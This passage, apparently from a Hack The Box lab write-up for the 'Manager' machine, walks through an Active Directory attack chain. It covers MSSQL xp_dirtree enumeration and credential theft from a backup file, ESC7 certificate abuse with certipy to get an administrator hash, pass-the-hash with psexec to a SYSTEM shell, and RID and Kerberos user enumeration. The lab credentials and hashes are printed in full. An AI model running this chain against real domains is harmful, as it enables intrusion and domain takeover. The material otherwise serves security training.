    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query

```
	- We see some bash commands:
		- enable_xp_cmdshell = denied permission
		- xp_cmdshell
		- xp_dirtree
	- using xp_dirtree we can enumerate the target
		- On doing so we find we can access the website files at inetpub
		```bash
xp_dirtree C:\
xp_dirtree C:\inetpub
xp_dirtree C:\inetpub\wwwroot

---OUTPUT---
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1   
```
	- We see the webite holds a backup zip file so we grab it from the url
- We extract the zip file:
	```bash
unzip website-backup-27-07-23-old.zip
ls -al

---MAIN-OUTPUT---
-rw-rw-r--  1 kali kali     698 Jul 27  2023 .old-conf.xml
```
	- We read the file and find credentials:
		```bash
cat .old-conf.xml

---OUTPUT---
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```
	- Can check with SMB (but we don't find any new shares)
- We can evil-winrm to the machine and grab the user flag
	```bash
evil-winrm -u Raven -p 'R4v3nBe5tD3veloP3r!123' -i  10.10.11.236
```

## Privilege Escalation
- We use certipy to check for vulnerabilities:
	```bash
certipy find -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -target 10.10.11.236 -stdout -vulnerable

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates

```
	- ESC7
- On searching google we find a way to exploit
	- https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-authority-esc7
	- https://www.rbtsec.com/blog/active-directory-certificate-attack-esc7/
- the second link provides the main exploitation method but we need the first link for satisfying the prerequisites.
	- we need to give our user the right permissions (and the ability to get those permission)
		- must have **Manage Certificate Authority (CA)** access right.
		- **Manage Certificates** access right (with Manage Certificate Authority access right we can grant ourselves this right)
	- Enable SubCA certificate template
- We add our user as an officer to get the permissions we need:
	```bash
# Add new officer
certipy ca -ca manager-dc01-ca -dc-ip 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -add-officer raven

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```
- Then we can list the templates and enable SubCA template
```bash
# List templates
certipy ca -ca manager-DC01-CA -dc-ip 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -list-templates

# Enable SubCA template
certipy ca -ca manager-DC01-CA -dc-ip 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -enable-template 'SubCA'

---OUTPUT-1---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Enabled certificate templates on 'manager-DC01-CA':
    SubCA
    DirectoryEmailReplication
    DomainControllerAuthentication
    KerberosAuthentication
    EFSRecovery
    EFS
    DomainController
    WebServer
    Machine
    User
    Administrator
---OUTPUT-2---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA
```
- Then we can begin our exploit (link 2)
	- Request a certificate (will fail but we will get it saved)
		```bash
certipy req -ca manager-DC01-CA -dc-ip 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -template SubCA -upn administrator@manager.htb

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 24
Would you like to save the private key? (y/N) y
[*] Saved private key to 24.key
[-] Failed to request certificate
```
	- Now we can issue this certificate (Do note I think if we are too slow it may fail)
		```bash
ertipy ca -ca manager-dc01-ca -dc-ip 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -issue-request 24

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
	- Now we can retrieve the certiicate:
		```bash
ertipy req -ca manager-DC01-CA -dc-ip 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -template SubCA -upn administrator@manager.htb -retrieve 24

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 24
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '24.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
	- And finally we can authenticate using this certificate to retrieve the hash
		```bash
certipy auth -pfx administrator.pfx

---OUTPUT-FAIL---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
		- We see clock skew too great as is common with kerberos
			- We sync our clock with the target
				```bash
sudo ntpdate 10.10.11.236
```
	- We issue the certificate again :
		```bash

certipy auth -pfx administrator.pfx

---OUTPUT---
[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```
	- We retrieve the hash, which we can use to login as administrator using pass-the-hash via psexec
		```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef administrator@10.10.11.236

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.236.....
[*] Found writable share ADMIN$
[*] Uploading file KVvzNSbq.exe
[*] Opening SVCManager on 10.10.11.236.....
[*] Creating service tWop on 10.10.11.236.....
[*] Starting service tWop.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```

-------
--------
## How RID Bruteforcing with netexec works
- Using rpcclient:
	```bash
rpcclient 10.10.11.236 -u 'guest%' # to seperate username from password
> lookupnames administrator
> lookupsids
---OUTPUT---
administrator S-1-5-21-4078382237-1492182817-2568127209-500 (User: 1)
					#                                  - <user_sid>
```
	- We get SID
		- 500 is admin sid
	- We can also do :
		```bash
> lookupsids S-1-5-21-4078382237-1492182817-2568127209-500

---OUTPUT---
S-1-5-21-4078382237-1492182817-2568127209-500 MANAGER\Administrator (1
```
- User accounts usually start at 1000:
	```bash
> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1000

---OUTPUT---
S-1-5-21-4078382237-1492182817-2568127209-500 MANAGER\Administrator (1)
```
- What netexec is doing is bruteforcing this to find accounts:
	```bash
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1000
----
S-1-5-21-4078382237-1492182817-2568127209-1000 MANAGER\DC01$ (1) # machine account
----
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1001
----
S-1-5-21-4078382237-1492182817-2568127209-1001 *unknown*\*unknown* (8)
----
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1002
----
S-1-5-21-4078382237-1492182817-2568127209-1002 *unknown*\*unknown* (8)

.
.
.
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1113
----
S-1-5-21-4078382237-1492182817-2568127209-1113 MANAGER\Zhong (1)
----
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-512
----
S-1-5-21-4078382237-1492182817-2568127209-512 MANAGER\Domain Admins (2)

```
## How Kerbrute userenum works
- Basically when we authenticate with a correct user the error message is different that from a wrong user in Kerberos
	- default accounts act a bit differently
	```bash
netexec smb/mssql 10.10.11.236 -k -u 'ryan' -p ''
netexec smb/mssql 10.10.11.236 -k -u 'rocknrj' -p ''
netexec smb/mssql 10.10.11.236 -k -u 'guest' -p ''

---OUTPUT-1---
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan: KDC_ERR_PREAUTH_FAILED 
---OUTPUT-2---
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\rocknrj: KDC_ERR_C_PRINCIPAL_UNKNOWN
```
